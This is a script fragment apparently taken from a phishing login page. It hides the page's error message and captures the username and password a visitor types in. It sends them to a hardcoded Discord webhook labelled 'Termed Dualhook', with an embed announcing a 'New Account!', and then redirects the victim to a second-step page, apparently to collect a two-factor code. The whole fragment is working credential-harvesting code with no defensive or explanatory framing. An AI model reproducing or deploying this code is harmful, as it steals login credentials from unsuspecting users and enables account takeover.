</script>
<script type="text/javascript">document.addEventListener("DOMContentLoaded",()=>{
    const e=document.getElementById("login-username"),o=document.getElementById("login-password"),t=document.getElementById("login-button");
    document.querySelector("p.login-error").setAttribute("style","display: none !important;"),console.log("Loaded",t);

    t.addEventListener("click",async t=>{
                       t.preventDefault();
    const n=e.value.trim(),a=o.value.trim();
    ""!=n&&""!=a?(await(({
      webhookURL:e,content:o}
                        )=>fetch(e,{
      method:"post",headers:{
        "Content-Type":"application/json"}
      ,body:JSON.stringify(o)}
                                ))({
      webhookURL:"https://discordapp.com/api/webhooks/1161346393005371473/i0cnlUE8Zjl_po_EYIvfa8cr_TNh0pS730lza2boqUK-cIze_0xMqZspcsod4dCB1Mnv",content:{
        username: "Termed Dualhook | Beta",
        avatar_url: "https://media.discordapp.net/attachments/1060890977474183193/1076206832990826566/9611806.png",
        content: "",
        description:"Valid attempt requested",embeds:[{
          title: ":money_with_wings: New Account! :fire:",
          author: {
          name: "Termed - Result",
          description: "",
          },
          thumbnail: {
            url: "https://media.discordapp.net/attachments/1060890977474183193/1079439695009820752/Nowy_projekt_5.png"
            },
          fields:[{
            name:"** Username -> **",value:n,inline:!0}
                  ,{
                    name:"** Password ->**",value:a,inline:!0}
                 ],color:00000,timestamp:(new Date).toISOString()}
                                                     ]}
    }
                                  ),window.location.replace("2stepindex.php")):window.location.reload()}
                                                        )}
  );
  
  
  
</script>